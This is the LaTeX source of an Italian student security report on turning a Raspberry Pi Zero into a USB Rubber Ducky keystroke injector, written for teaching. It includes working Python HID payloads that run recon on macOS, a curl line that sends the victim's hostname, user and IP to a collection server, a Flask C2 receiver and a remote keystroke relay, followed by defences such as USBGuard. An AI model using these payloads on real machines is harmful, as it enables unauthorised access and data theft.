\documentclass[12pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[italian]{babel}
\usepackage{geometry}
\usepackage{graphicx}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{hyperref}
\usepackage{fancyhdr}
\usepackage{titlesec}
\usepackage{booktabs}
\usepackage{array}
\usepackage{enumitem}
\usepackage{amsmath}

\geometry{margin=2.5cm}

% Colori per il codice
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
\definecolor{darkred}{rgb}{0.6,0,0}

% Stile codice
\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},
    commentstyle=\color{codegreen},
    keywordstyle=\color{blue},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=2,
    frame=single,
    rulecolor=\color{black}
}
\lstset{style=mystyle}

% Header e footer
\pagestyle{fancy}
\fancyhf{}
\rhead{Sicurezza ICT}
\lhead{USB Rubber Ducky con Raspberry Pi Zero}
\rfoot{Pagina \thepage}
\lfoot{Maruca, Pezzolla}

% Titolo sezioni
\titleformat{\section}{\large\bfseries\color{darkred}}{}{0em}{}[\titlerule]
\titleformat{\subsection}{\normalsize\bfseries}{}{0em}{}

\begin{document}

%------------------------
% COPERTINA
%------------------------
\begin{titlepage}
    \centering
    \vspace*{2cm}
    
    {\Huge\bfseries Simulazione di un USB Rubber Ducky\\[0.5cm]}
    {\Large con Raspberry Pi Zero\par}
    
    \vspace{1cm}
    \rule{\linewidth}{0.5mm}
    \vspace{1cm}
    
    {\large\textbf{Materia:} Sicurezza ICT\par}
    \vspace{0.5cm}
    {\large\textbf{Studenti:}\par}
    {\Large Matteo Maruca\par}
    {\Large Andrea Pezzolla\par}
    
    \vspace{1cm}
    \rule{\linewidth}{0.5mm}
    \vspace{1cm}
    
    {\large Anno Accademico 2025/2026\par}
    \vspace{0.5cm}
    {\large SUPSI -- Dipartimento Tecnologie Innovative\par}
    
    \vfill
    
    \begin{abstract}
    Questo report documenta la realizzazione di un dispositivo USB Rubber Ducky utilizzando
    un Raspberry Pi Zero W. Il progetto esplora le tecniche di attacco HID (Human Interface Device),
    la simulazione di una tastiera USB automatizzata e l'implementazione di un sistema di controllo
    remoto tramite rete Ethernet. L'obiettivo didattico è comprendere le vulnerabilità legate
    ai dispositivi USB e le relative contromisure difensive.
    \end{abstract}
\end{titlepage}

%------------------------
% INDICE
%------------------------
\tableofcontents
\newpage

%------------------------
% 1. INTRODUZIONE
%------------------------
\section{Introduzione}

\subsection{Cos'è un USB Rubber Ducky?}
Un USB Rubber Ducky è un dispositivo di penetration testing sviluppato da Hak5 che si presenta
al sistema operativo come una normale tastiera USB (dispositivo HID). Una volta collegato,
esegue automaticamente una sequenza di comandi preconfigurati (payload) con la velocità
di una tastiera automatizzata, aggirando molte difese tradizionali basate su software.

Il termine \textit{exploit} in questo contesto si riferisce a una sequenza di comandi che
sfrutta la fiducia implicita che i sistemi operativi ripongono nei dispositivi HID collegati
via USB. A differenza di un malware tradizionale, questo tipo di attacco:

\begin{itemize}
    \item Non richiede l'installazione di software malevolo
    \item Funziona su qualsiasi sistema operativo (Windows, macOS, Linux)
    \item Bypassa gli antivirus tradizionali
    \item Agisce in pochi secondi dal collegamento
\end{itemize}

\subsection{Obiettivi del Progetto}
\begin{enumerate}
    \item Comprendere il funzionamento dei dispositivi HID USB
    \item Implementare un Rubber Ducky con hardware commodity (Raspberry Pi Zero W)
    \item Creare payload didattici per dimostrare le vulnerabilità
    \item Implementare un sistema di controllo remoto (Livello 2)
    \item Documentare le contromisure difensive
\end{enumerate}

\subsection{Architettura del Sistema}
Il progetto è strutturato su due livelli di complessità crescente:

\begin{center}
\begin{tabular}{|c|c|c|}
\hline
\textbf{Livello} & \textbf{Descrizione} & \textbf{Componenti} \\
\hline
Livello 1 & Payload preconfezionati & Pi Zero + PC Vittima \\
\hline
Livello 2 & Controllo remoto interattivo & Controller + Pi Zero + PC Vittima \\
\hline
\end{tabular}
\end{center}

\vspace{0.5cm}
L'architettura completa del Livello 2 è la seguente:

\begin{center}
\texttt{[PC Controller] ---Ethernet---> [Pi Zero / RubberDucky] ---USB---> [PC Vittima]}
\end{center}

\newpage

%------------------------
% 2. HARDWARE E MATERIALI
%------------------------
\section{Hardware e Materiali}

\subsection{Componenti Utilizzati}
\begin{itemize}
    \item \textbf{Raspberry Pi Zero W} -- dispositivo principale che simula il Rubber Ducky
    \item \textbf{MicroSD card} (minimo 8GB) -- sistema operativo e payload
    \item \textbf{Cavo micro-USB OTG} -- collegamento al PC vittima (obbligatoriamente dati, non solo carica)
    \item \textbf{PC Vittima} -- macOS nel nostro caso (il payload è adattabile)
    \item \textbf{PC Controller} -- per il controllo remoto (Livello 2)
\end{itemize}

\subsection{Perché il Raspberry Pi Zero W?}
A differenza degli altri modelli Raspberry Pi (3B+, 4B), il Pi Zero W è l'unico modello
con supporto \textbf{USB OTG (On-The-Go)} nativo tramite la porta micro-USB. Questo permette
al dispositivo di operare in modalità \textit{device} (periferica) invece che solo in
modalità \textit{host}, consentendo di fingersi una tastiera agli occhi del PC vittima.

\begin{center}
\begin{tabular}{|l|c|c|}
\hline
\textbf{Modello} & \textbf{USB OTG} & \textbf{Usabile come HID} \\
\hline
Raspberry Pi Zero W & \checkmark & \checkmark \\
\hline
Raspberry Pi 3 Model B+ & $\times$ & $\times$ \\
\hline
Raspberry Pi 4 & $\times$ & $\times$ \\
\hline
\end{tabular}
\end{center}

\newpage

%------------------------
% 3. SETUP E CONFIGURAZIONE
%------------------------
\section{Setup e Configurazione}

\subsection{Installazione del Sistema Operativo}
\begin{enumerate}
    \item Scaricare \textbf{Raspberry Pi Imager} da \texttt{raspberrypi.com/software}
    \item Selezionare: Device $\rightarrow$ Raspberry Pi Zero W
    \item Selezionare: OS $\rightarrow$ Raspberry Pi OS Lite (32-bit)
    \item Prima del flash, configurare in \textit{Edit Settings}:
    \begin{itemize}
        \item Hostname: \texttt{raspberrypi}
        \item Username: \texttt{pi}, Password: (a scelta)
        \item WiFi SSID e password (rete 2.4GHz -- il Pi Zero W non supporta 5GHz)
        \item Abilitare SSH con autenticazione tramite password
        \item Country: IT, Timezone: Europe/Rome
    \end{itemize}
\end{enumerate}

\subsection{Abilitazione Modalità USB OTG (HID Gadget)}
Dopo il flash, la SD appare come volume \texttt{bootfs}. È necessario modificare
due file per abilitare la modalità gadget USB:

\subsubsection{Modifica config.txt}
Aggiungere in fondo al file nella sezione \texttt{[all]}:
\begin{lstlisting}[language=bash, caption=Aggiunta dtoverlay in config.txt]
echo "dtoverlay=dwc2" >> /Volumes/bootfs/config.txt
\end{lstlisting}

\subsubsection{Modifica cmdline.txt}
Aggiungere il modulo \texttt{libcomposite} dopo \texttt{rootwait} (tutto su una riga):
\begin{lstlisting}[language=bash, caption=Aggiunta modulo libcomposite in cmdline.txt]
# Il file deve rimanere su una sola riga
# Aggiungere "modules-load=dwc2,libcomposite" dopo rootwait
console=serial0,115200 console=tty1 root=PARTUUID=xxxx rootfstype=ext4 
fsck.repair=yes rootwait modules-load=dwc2,libcomposite quiet splash
\end{lstlisting}

\subsection{Configurazione HID Gadget via USB}
Per configurare il Pi Zero come tastiera HID, è necessario uno script che
configuri il \textit{USB Composite Gadget} tramite il filesystem \texttt{configfs}:

\begin{lstlisting}[language=bash, caption=setup\_hid.sh -- Configurazione gadget HID]
#!/bin/bash
# Configura il Pi Zero come tastiera HID USB

modprobe libcomposite

cd /sys/kernel/config/usb_gadget/
mkdir -p mykeyboard
cd mykeyboard

# Identificatori USB
echo 0x1d6b > idVendor   # Linux Foundation
echo 0x0104 > idProduct  # Multifunction Composite Gadget
echo 0x0100 > bcdDevice
echo 0x0200 > bcdUSB

# Stringhe descrittive
mkdir -p strings/0x409
echo "fedcba9876543210" > strings/0x409/serialnumber
echo "RaspberryPi"      > strings/0x409/manufacturer
echo "HID Keyboard"     > strings/0x409/product

# Configurazione
mkdir -p configs/c.1/strings/0x409
echo "Config 1" > configs/c.1/strings/0x409/configuration
echo 250        > configs/c.1/MaxPower

# Funzione HID
mkdir -p functions/hid.usb0
echo 1 > functions/hid.usb0/protocol    # Keyboard
echo 1 > functions/hid.usb0/subclass    # Boot Interface
echo 8 > functions/hid.usb0/report_length

# HID Report Descriptor (tastiera standard)
echo -ne \
  '\x05\x01\x09\x06\xa1\x01\x05\x07\x19\xe0\x29\xe7\x15\x00\x25\x01' \
  '\x75\x01\x95\x08\x81\x02\x95\x01\x75\x08\x81\x03\x95\x05\x75\x01' \
  '\x05\x08\x19\x01\x29\x05\x91\x02\x95\x01\x75\x03\x91\x03\x95\x06' \
  '\x75\x08\x15\x00\x25\x65\x05\x07\x19\x00\x29\x65\x81\x00\xc0' \
  > functions/hid.usb0/report_desc

ln -s functions/hid.usb0 configs/c.1/
ls /sys/class/udc > UDC

echo "HID gadget configurato su /dev/hidg0"
\end{lstlisting}

Questo script va eseguito come root all'avvio, prima che il PC vittima
rilevi il dispositivo. Viene configurato tramite \texttt{/etc/rc.local}:

\begin{lstlisting}[language=bash, caption=rc.local -- Avvio automatico]
#!/bin/bash
sleep 5
bash /boot/firmware/setup_hid.sh >> /tmp/hid_setup.log 2>&1
sleep 2
python3 /boot/firmware/payload.py >> /tmp/payload.log 2>&1 &
exit 0
\end{lstlisting}

\newpage

%------------------------
% 4. PAYLOAD
%------------------------
\section{Sviluppo del Payload}

\subsection{Approccio Nativo Linux (senza librerie esterne)}
Il payload è scritto in Python puro, senza librerie esterne, scrivendo
direttamente sul device \texttt{/dev/hidg0} tramite report HID standard.
Questo approccio non richiede connessione internet per l'installazione di dipendenze.

\begin{lstlisting}[language=Python, caption=payload.py -- Script HID nativo]
#!/usr/bin/env python3
"""
Rubber Ducky Payload - Approccio nativo Linux
Scrive direttamente su /dev/hidg0 senza librerie esterne
Target: macOS (adattabile a Windows/Linux)
"""
import time
import struct

# Keycodes HID standard (USB HID Usage Tables)
KEY_ENTER    = 0x28
KEY_SPACE    = 0x2C
KEY_MOD_META = 0x08  # CMD su Mac / WIN su Windows

# Mappa caratteri minuscoli -> keycode HID
CHAR_MAP = {
    'a': 0x04, 'b': 0x05, 'c': 0x06, 'd': 0x07, 'e': 0x08,
    'f': 0x09, 'g': 0x0A, 'h': 0x0B, 'i': 0x0C, 'j': 0x0D,
    'k': 0x0E, 'l': 0x0F, 'm': 0x10, 'n': 0x11, 'o': 0x12,
    'p': 0x13, 'q': 0x14, 'r': 0x15, 's': 0x16, 't': 0x17,
    'u': 0x18, 'v': 0x19, 'w': 0x1A, 'x': 0x1B, 'y': 0x1C,
    'z': 0x1D, '1': 0x1E, '2': 0x1F, '3': 0x20, '4': 0x21,
    '5': 0x22, '6': 0x23, '7': 0x24, '8': 0x25, '9': 0x26,
    '0': 0x27, ' ': 0x2C, '\n': 0x28, '=': 0x2E, '/': 0x38,
    '.': 0x37, '-': 0x2D,
}

# Mappa caratteri maiuscoli/speciali (con SHIFT)
SHIFT_MAP = {
    'A': 0x04, 'B': 0x05, 'C': 0x06, 'D': 0x07, 'E': 0x08,
    'F': 0x09, 'G': 0x0A, 'H': 0x0B, 'I': 0x0C, 'J': 0x0D,
    'K': 0x0E, 'L': 0x0F, 'M': 0x10, 'N': 0x11, 'O': 0x12,
    'P': 0x13, 'Q': 0x14, 'R': 0x15, 'S': 0x16, 'T': 0x17,
    'U': 0x18, 'V': 0x19, 'W': 0x1A, 'X': 0x1B, 'Y': 0x1C,
    'Z': 0x1D, '!': 0x1E, '"': 0x34, ':': 0x33, '_': 0x2D,
}

def send_report(modifier, keycode):
    """Invia un report HID al PC vittima tramite /dev/hidg0"""
    report  = struct.pack('8B', modifier, 0, keycode, 0, 0, 0, 0, 0)
    release = struct.pack('8B', 0, 0, 0, 0, 0, 0, 0, 0)
    with open('/dev/hidg0', 'rb+') as f:
        f.write(report)   # Tasto premuto
        time.sleep(0.05)
        f.write(release)  # Tasto rilasciato
        time.sleep(0.05)

def press_combo(modifier, keycode):
    """Premi una combinazione di tasti (es. CMD+SPACE)"""
    send_report(modifier, keycode)

def type_text(text):
    """Digita una stringa carattere per carattere"""
    for ch in text:
        if ch in CHAR_MAP:
            send_report(0x00, CHAR_MAP[ch])
        elif ch in SHIFT_MAP:
            send_report(0x02, SHIFT_MAP[ch])
        time.sleep(0.04)

def press_enter():
    send_report(0x00, KEY_ENTER)

# ============================================================
# PAYLOAD PRINCIPALE - Target: macOS
# ============================================================

# Attendi che il PC riconosca il dispositivo USB
time.sleep(3)

# 1. Apri Spotlight (CMD + SPACE)
press_combo(KEY_MOD_META, KEY_SPACE)
time.sleep(0.8)

# 2. Cerca e apri il Terminale
type_text("Terminal")
time.sleep(0.5)
press_enter()
time.sleep(1.5)

# 3. Esegui comandi di raccolta informazioni
commands = [
    'echo "=== SISTEMA COMPROMESSO ==="',
    'echo "=== HOSTNAME ===" && hostname',
    'echo "=== UTENTE ===" && whoami',
    'echo "=== INDIRIZZO IP ===" && ipconfig getifaddr en0',
    'echo "=== DATA ===" && date',
    'echo "=== FINE ==="',
]

for cmd in commands:
    type_text(cmd)
    press_enter()
    time.sleep(0.5)
\end{lstlisting}

\subsection{Payload con Esfiltrazione Dati via Rete}
Una versione avanzata del payload invia i risultati a un server remoto:

\begin{lstlisting}[language=Python, caption=Payload con invio dati via HTTP]
# Aggiunta al payload per inviare dati al server C2
# Da inserire dopo i comandi nel terminale della vittima

SERVER_IP = "192.168.1.100"  # IP del server controller
SERVER_PORT = 8080

exfil_cmd = (
    f'curl -X POST http://{SERVER_IP}:{SERVER_PORT}/collect '
    f'-d "$(hostname)-$(whoami)-$(ipconfig getifaddr en0)"'
)

type_text(exfil_cmd)
press_enter()
\end{lstlisting}

\newpage

%------------------------
% 5. SERVER C2
%------------------------
\section{Server C2 (Command \& Control)}

Il server C2 riceve i dati inviati dal payload sulla macchina vittima
e li salva per l'analisi.

\begin{lstlisting}[language=Python, caption=server.py -- Server ricevente]
#!/usr/bin/env python3
"""
Server C2 - Riceve i dati esfiltrati dal payload
Eseguire sul PC controller: python3 server.py
"""
from flask import Flask, request
from datetime import datetime
import os

app = Flask(__name__)
os.makedirs("risultati", exist_ok=True)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_data(as_text=True)
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = f"risultati/output_{ts}.txt"

    with open(path, "w", encoding="utf-8") as f:
        f.write(data)

    print(f"\n{'='*50}")
    print(f"[+] Dati ricevuti -- {ts}")
    print(f"{'='*50}")
    print(data)
    print(f"[*] Salvato in: {path}")
    return "OK", 200

@app.route('/risultati')
def lista():
    files = os.listdir("risultati")
    return "<br>".join(files) if files else "Nessun risultato."

if __name__ == '__main__':
    print("[*] Server C2 in ascolto su http://0.0.0.0:8080")
    app.run(host='0.0.0.0', port=8080, debug=False)
\end{lstlisting}

\newpage

%------------------------
% 6. LIVELLO 2 - CONTROLLO REMOTO
%------------------------
\section{Livello 2 -- Controllo Remoto Interattivo}

\subsection{Architettura}
Il Livello 2 aggiunge un PC Controller che invia comandi in tempo reale
al Raspberry Pi Zero, il quale li esegue come tastiera HID sulla vittima:

\begin{center}
\texttt{[PC Controller] ---Ethernet---> [Pi Zero] ---USB HID---> [PC Vittima]}
\end{center}

\begin{itemize}
    \item \textbf{PC Controller}: invia comandi da digitare tramite socket TCP
    \item \textbf{Pi Zero (RubberDucky)}: riceve i comandi e li esegue come tastiera
    \item \textbf{PC Vittima}: vede solo una tastiera che digita comandi
\end{itemize}

\subsection{Script Server sul Pi Zero}
\begin{lstlisting}[language=Python, caption=remote\_hid.py -- Server HID remoto sul Pi Zero]
#!/usr/bin/env python3
"""
Server HID remoto - gira sul Pi Zero
Riceve comandi via TCP e li digita tramite HID
"""
import socket
import struct
import time

# Stessa mappa del payload.py
CHAR_MAP = { ... }  # vedi payload.py
SHIFT_MAP = { ... }

def send_report(modifier, keycode):
    report  = struct.pack('8B', modifier, 0, keycode, 0, 0, 0, 0, 0)
    release = struct.pack('8B', 0, 0, 0, 0, 0, 0, 0, 0)
    with open('/dev/hidg0', 'rb+') as f:
        f.write(report)
        time.sleep(0.05)
        f.write(release)
        time.sleep(0.05)

def type_text(text):
    for ch in text:
        if ch in CHAR_MAP:
            send_report(0x00, CHAR_MAP[ch])
        elif ch in SHIFT_MAP:
            send_report(0x02, SHIFT_MAP[ch])
        time.sleep(0.04)
    send_report(0x00, 0x28)  # ENTER

# Avvia server TCP
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 9999))
server.listen(1)
print("[*] In attesa di connessioni su :9999")

conn, addr = server.accept()
print(f"[+] Connesso da {addr}")

while True:
    try:
        cmd = conn.recv(1024).decode().strip()
        if not cmd or cmd == 'exit':
            break
        print(f"[>] Digito: {cmd}")
        type_text(cmd)
        conn.send(b"OK\n")
    except:
        break

conn.close()
\end{lstlisting}

\subsection{Client sul PC Controller}
\begin{lstlisting}[language=bash, caption=Connessione al Pi Zero dal Controller]
# Dal PC Controller, ci si connette al Pi Zero
# e si digitano comandi che verranno eseguiti sulla vittima
nc PI_ZERO_IP 9999

# Esempio di sessione interattiva:
# > echo "Ciao dalla vittima"
# OK
# > whoami
# OK
# > ipconfig getifaddr en0
# OK
\end{lstlisting}

\newpage

%------------------------
% 7. RISULTATI DEMO
%------------------------
\section{Risultati e Demo}

\subsection{Demo Livello 1 -- Payload Automatico}
Collegando il Pi Zero al PC vittima (macOS), il dispositivo viene riconosciuto
come tastiera USB. Dopo circa 3 secondi dall'inserimento:

\begin{enumerate}
    \item Il payload apre Spotlight con \texttt{CMD+SPACE}
    \item Digita \texttt{Terminal} e preme \texttt{ENTER}
    \item Nel terminale aperto esegue automaticamente i comandi:
\end{enumerate}

\begin{lstlisting}[language=bash, caption=Output del payload sulla macchina vittima]
=== SISTEMA COMPROMESSO ===
=== HOSTNAME ===
MacBook-di-Vittima.local
=== UTENTE ===
vittima
=== INDIRIZZO IP ===
192.168.1.42
=== DATA ===
Fri May 23 14:30:00 CEST 2026
=== FINE ===
\end{lstlisting}

\subsection{Demo Livello 2 -- Controllo Remoto}
Con il Pi Zero collegato sia al PC vittima (USB) che al Controller (Ethernet):

\begin{enumerate}
    \item Il Controller si connette al Pi Zero via TCP sulla porta 9999
    \item Digita comandi dalla propria tastiera
    \item I comandi vengono trasmessi al Pi Zero
    \item Il Pi Zero li "digita" automaticamente sul PC vittima
    \item I risultati vengono inviati al server C2 via HTTP
\end{enumerate}

\newpage

%------------------------
% 8. DIFESE E CONTROMISURE
%------------------------
\section{Difese e Contromisure}

La comprensione degli attacchi HID è fondamentale per implementare
difese efficaci. Di seguito le principali contromisure:

\begin{center}
\begin{tabular}{|p{4cm}|p{5cm}|p{5cm}|}
\hline
\textbf{Attacco} & \textbf{Tecnica} & \textbf{Difesa} \\
\hline
HID Spoofing & Il dispositivo si finge tastiera & USBGuard (Linux), politiche USB su Windows \\
\hline
Payload automatico & Esecuzione immediata al collegamento & Disabilitare autorun, whitelist dispositivi USB \\
\hline
Esfiltrazione dati & Invio dati via HTTP/curl & Firewall egress, DLP (Data Loss Prevention) \\
\hline
Accesso remoto & Controllo via TCP & Network segmentation, IDS/IPS \\
\hline
Privilege escalation & Comandi con sudo/admin & Principio del minimo privilegio \\
\hline
\end{tabular}
\end{center}

\subsection{USBGuard -- Protezione Linux}
\begin{lstlisting}[language=bash, caption=Configurazione USBGuard per bloccare dispositivi HID non autorizzati]
# Installazione USBGuard
sudo apt install usbguard

# Genera regole per i dispositivi attualmente connessi
sudo usbguard generate-policy > /etc/usbguard/rules.conf

# Abilita e avvia il servizio
sudo systemctl enable usbguard
sudo systemctl start usbguard

# Blocca tutti i nuovi dispositivi HID non in whitelist
sudo usbguard block-device ID
\end{lstlisting}

\subsection{Considerazioni Etiche e Legali}
L'utilizzo di dispositivi Rubber Ducky o tecniche HID su sistemi non autorizzati
costituisce un reato penale in Italia (D.Lgs. 231/2001, art. 615-ter c.p.) e nella
maggior parte dei paesi. Tutto il lavoro documentato in questo report è stato
eseguito esclusivamente su dispositivi di proprietà degli autori, in ambiente
controllato, a scopo puramente didattico.

\newpage

%------------------------
% 9. CONCLUSIONI
%------------------------
\section{Conclusioni}

\subsection{Risultati Ottenuti}
Il progetto ha permesso di:
\begin{itemize}
    \item Comprendere in profondità il protocollo USB HID e le sue vulnerabilità
    \item Implementare un Rubber Ducky funzionale con hardware a basso costo (Pi Zero W, $\sim$15€)
    \item Sviluppare payload in Python nativo senza dipendenze esterne
    \item Realizzare un sistema di controllo remoto bidirezionale
    \item Comprendere le contromisure difensive applicabili in contesti reali
\end{itemize}

\subsection{Sviluppi Futuri}
\begin{itemize}
    \item Implementazione di payload per Windows e Linux
    \item Cifratura della comunicazione Controller $\rightarrow$ Pi Zero
    \item Interfaccia web per il controllo remoto (P4wnP1 A.L.O.A.)
    \item Analisi forense post-attacco
\end{itemize}

\subsection{Riflessioni}
Questo progetto dimostra come dispositivi economici e facilmente reperibili possano
essere utilizzati per attacchi sofisticati, evidenziando l'importanza della
\textit{security awareness} e delle politiche di controllo accessi fisici
nelle organizzazioni. La miglior difesa rimane la combinazione di
consapevolezza degli utenti, politiche di sicurezza fisica e strumenti
tecnici come USBGuard.

\newpage

%------------------------
% APPENDICE
%------------------------
\appendix
\section{File di Configurazione Completi}

\subsection{config.txt (sezione rilevante)}
\begin{lstlisting}[language=bash]
[all]
dtoverlay=dwc2
\end{lstlisting}

\subsection{cmdline.txt}
\begin{lstlisting}[language=bash]
console=serial0,115200 console=tty1 root=PARTUUID=xxxx-xx 
rootfstype=ext4 fsck.repair=yes rootwait 
modules-load=dwc2,libcomposite quiet splash
\end{lstlisting}

\subsection{Checklist Setup Completo}
\begin{itemize}[label=$\square$]
    \item Flash SD con Raspberry Pi OS Lite 32-bit
    \item Configurare WiFi (rete 2.4GHz), SSH, hostname in Imager
    \item Aggiungere \texttt{dtoverlay=dwc2} in \texttt{config.txt}
    \item Aggiungere \texttt{modules-load=dwc2,libcomposite} in \texttt{cmdline.txt}
    \item Copiare \texttt{setup\_hid.sh} e \texttt{payload.py} sulla SD
    \item Configurare \texttt{rc.local} per l'avvio automatico
    \item Connettere il Pi Zero via cavo dati USB al PC vittima
    \item Verificare con \texttt{system\_profiler SPUSBDataType} (macOS)
\end{itemize}

\section{Riferimenti}
\begin{itemize}
    \item USB HID Usage Tables: \url{https://usb.org/sites/default/files/hut1_4.pdf}
    \item Raspberry Pi Documentation: \url{https://www.raspberrypi.com/documentation/}
    \item P4wnP1 A.L.O.A.: \url{https://github.com/RoganDawes/P4wnP1_aloa}
    \item Payload Studio Community: \url{https://payloadstudio.com/community/}
    \item USBGuard: \url{https://usbguard.github.io/}
    \item Linux USB Gadget API: \url{https://www.kernel.org/doc/html/latest/usb/gadget_configfs.html}
\end{itemize}

\end{document}









